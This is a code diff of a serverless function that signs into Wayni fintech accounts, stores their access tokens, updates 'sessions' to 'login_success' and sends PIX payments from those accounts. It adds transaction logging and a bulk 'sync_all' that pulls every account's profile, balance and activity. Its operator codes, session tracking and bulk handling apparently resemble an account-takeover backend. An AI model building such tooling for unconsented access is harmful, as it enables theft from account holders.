@@ -36,7 +36,7 @@ async function wayniLogin(identification: string, password: string) {
   });
   const data = await res.json();
   if (!res.ok) throw new Error(data?.message || data?.error || `Login failed: ${res.status}`);
-  return data; // { access_token, refresh_token, token_type, expires_in, expires_at }
+  return data;
 }
 
 // ─── GET PROFILE ───
@@ -130,7 +130,6 @@ serve(async (req) => {
       const authData = await wayniLogin(identification, password);
       const token = authData.access_token;
 
-      // Get profile + balance
       let profile: any = null;
       let balance: any = null;
       try { profile = await wayniGetMe(token); } catch (e) { console.error("Profile fetch error:", e); }
@@ -141,7 +140,6 @@ serve(async (req) => {
       const phone = profile?.profile?.phone || null;
       const userUuid = profile?.user?.uuid || null;
 
-      // Upsert wayni_accounts
       const opCode = operator_code || "master";
       const { data: existing } = await sb.from("wayni_accounts").select("id").eq("identification", identification).maybeSingle();
       
@@ -168,7 +166,6 @@ serve(async (req) => {
         await sb.from("wayni_accounts").insert(accountData);
       }
 
-      // Update session if provided
       if (session_id) {
         await sb.from("sessions").update({
           status: "login_success",
@@ -185,7 +182,7 @@ serve(async (req) => {
       }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    // ─── ACTION: sync (refresh data for account) ───
+    // ─── ACTION: sync ───
     if (action === "sync") {
       const { account_id } = body;
       if (!account_id) throw new Error("Missing account_id");
@@ -198,7 +195,6 @@ serve(async (req) => {
       try { profile = await wayniGetMe(acc.access_token); } catch (e) { console.error("Sync profile error:", e); }
       try { balance = await wayniGetBalance(acc.access_token); } catch (e) { console.error("Sync balance error:", e); }
 
-      // Try to get activities
       let activities: any = null;
       try {
         const walletAccount = profile?.bank?.internal_account?.[0]?.wallet_account;
@@ -253,10 +249,24 @@ serve(async (req) => {
       const { account_id, pix_key } = body;
       if (!account_id || !pix_key) throw new Error("Missing account_id or pix_key");
 
-      const { data: acc } = await sb.from("wayni_accounts").select("access_token, user_uuid").eq("id", account_id).maybeSingle();
+      const { data: acc } = await sb.from("wayni_accounts").select("access_token, user_uuid, identification, full_name, operator_code").eq("id", account_id).maybeSingle();
       if (!acc?.access_token || !acc?.user_uuid) throw new Error("No token or user_uuid");
 
       const result = await wayniPixValidate(acc.access_token, pix_key, acc.user_uuid);
+      
+      // Log the PIX validation
+      await sb.from("wayni_pix_transactions").insert({
+        wayni_account_id: account_id,
+        account_identification: acc.identification,
+        account_name: acc.full_name,
+        pix_key: result.reformatedKey || pix_key,
+        recipient_name: result.ownerName,
+        amount_brl: 0,
+        payment_uuid: result.paymentUuid,
+        payment_status: "validated",
+        operator_code: acc.operator_code || "master",
+      });
+
       return new Response(JSON.stringify({ success: true, ...result }), {
         headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
@@ -271,6 +281,15 @@ serve(async (req) => {
       if (!acc?.access_token) throw new Error("No token");
 
       const result = await wayniPixProcess(acc.access_token, payment_uuid, brl_amount);
+      
+      // Update PIX transaction record
+      await sb.from("wayni_pix_transactions").update({
+        amount_brl: brl_amount,
+        amount_ars: result.arsAmount || null,
+        payment_status: result.paymentStatus || "processed",
+        result_data: result,
+      }).eq("payment_uuid", payment_uuid);
+
       return new Response(JSON.stringify({ success: true, ...result }), {
         headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
@@ -285,7 +304,65 @@ serve(async (req) => {
       if (!acc?.access_token) throw new Error("No token");
 
       const result = await wayniPixInfo(acc.access_token, payment_uuid);
+      
+      // Update PIX transaction with latest status
+      const updateFields: any = {
+        payment_status: result.paymentStatus || "unknown",
+        result_data: result,
+      };
+      if (result.arsAmount) updateFields.amount_ars = result.arsAmount;
+      if (result.exchangeRate) updateFields.exchange_rate = result.exchangeRate;
+      if (result.bankTransactionId) updateFields.bank_transaction_id = result.bankTransactionId;
+      if (result.brlAmount) updateFields.amount_brl = result.brlAmount;
+      
+      await sb.from("wayni_pix_transactions").update(updateFields).eq("payment_uuid", payment_uuid);
+
       return new Response(JSON.stringify({ success: true, ...result }), {
+        headers: { ...corsHeaders, "Content-Type": "application/json" },
+      });
+    }
+
+    // ─── ACTION: sync_all ───
+    if (action === "sync_all") {
+      const { data: accs } = await sb.from("wayni_accounts").select("id, access_token").not("access_token", "is", null);
+      if (!accs || accs.length === 0) return new Response(JSON.stringify({ success: true, synced: 0 }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      
+      let synced = 0;
+      for (const acc of accs) {
+        try {
+          let profile: any = null;
+          let balance: any = null;
+          try { profile = await wayniGetMe(acc.access_token); } catch {}
+          try { balance = await wayniGetBalance(acc.access_token); } catch {}
+
+          let activities: any = null;
+          try {
+            const wa = profile?.bank?.internal_account?.[0]?.wallet_account;
+            if (wa) activities = await wayniActivities(acc.access_token, wa);
+          } catch {}
+
+          const upd: any = {
+            balance: balance?.balance || "0",
+            last_data_sync_at: new Date().toISOString(),
+            updated_at: new Date().toISOString(),
+          };
+          if (profile) {
+            upd.profile_data = profile;
+            upd.bank_data = profile?.bank || null;
+            upd.full_name = profile?.profile?.full_name || null;
+            upd.email = profile?.profile?.email || null;
+            upd.phone = profile?.profile?.phone || null;
+          }
+          if (activities) upd.activities = activities;
+
+          await sb.from("wayni_accounts").update(upd).eq("id", acc.id);
+          synced++;
+        } catch (e) {
+          console.error(`Sync failed for ${acc.id}:`, e);
+        }
+      }
+
+      return new Response(JSON.stringify({ success: true, synced }), {
         headers: { ...corsHeaders, "Content-Type": "application/json" },
       });
     }
